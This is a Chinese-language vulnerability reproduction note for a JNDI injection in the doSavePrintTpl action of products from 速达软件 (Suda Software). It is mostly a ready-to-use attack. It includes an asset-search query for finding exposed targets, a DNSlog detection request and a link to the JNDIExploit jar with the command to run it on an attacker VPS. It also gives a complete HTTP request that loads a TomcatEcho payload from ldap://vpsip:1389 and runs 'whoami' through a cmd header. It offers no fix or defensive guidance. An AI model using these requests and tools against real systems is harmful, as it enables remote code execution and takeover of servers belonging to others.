# 速达软件技术（广州）有限公司多款产品doSavePrintTpl存在JNID注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品doSavePrintTpl存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征

![1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5.png](./img/QAbLP8DmRYya9Ntj/1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5-904597.png)

![1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae.png](./img/QAbLP8DmRYya9Ntj/1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae-167294.png)

# 四、漏洞复现
1. 获取dnslog

```plain
dffd7g.dnslog.cn
```

![1705076759218-f2ad57b9-38b3-4bfb-8f69-79043a410b56.png](./img/QAbLP8DmRYya9Ntj/1705076759218-f2ad57b9-38b3-4bfb-8f69-79043a410b56-744974.png)

2. 检测是否存在漏洞

```plain
GET /common/print/print!doSavePrintTpl.action?report=${jndi:ldap://dffd7g.dnslog.cn}&&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```

![1705076798010-03a14e61-09f8-48d9-9296-d38fd1468d27.png](./img/QAbLP8DmRYya9Ntj/1705076798010-03a14e61-09f8-48d9-9296-d38fd1468d27-576024.png)

![1705076811911-81f56a2d-56c6-419b-947c-0451210e8e69.png](./img/QAbLP8DmRYya9Ntj/1705076811911-81f56a2d-56c6-419b-947c-0451210e8e69-461086.png)

漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146317-10daccfd-9800-4fa7-899a-ce904aab6f1d.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```

![1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb.png](./img/QAbLP8DmRYya9Ntj/1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb-838512.png)

```plain
GET /common/print/print!doSavePrintTpl.action?report=${jndi:ldap://vpsip:1389/Basic/TomcatEcho}&&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```

![1705076893410-959d7fbf-d434-483d-b195-e12231942b95.png](./img/QAbLP8DmRYya9Ntj/1705076893410-959d7fbf-d434-483d-b195-e12231942b95-014530.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/naif5is5o46eq9h6>